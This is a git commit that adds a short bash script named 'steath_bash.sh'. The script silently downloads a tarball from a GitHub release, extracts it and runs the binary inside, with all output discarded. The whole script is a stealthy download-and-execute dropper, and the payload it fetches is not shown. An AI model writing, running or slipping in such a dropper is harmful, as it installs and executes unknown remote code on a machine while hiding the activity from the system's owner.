e1f33de44bef9e6a65471593bde06d566c2251a0
ariary <ariary9.2@hotmail.fr>
2021-08-30 09:34:30 +0200

    Create steath_bash.sh

---
+++ steath_bash.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+wget https://github.com/ariary/sexonthebash/releases/download/v1.0/sexonthebashv1.0.tar.gz > /dev/null 2>&1
+tar xf sexonthebashv1.0.tar.gz > /dev/null 2>&1
+./sexonthebash
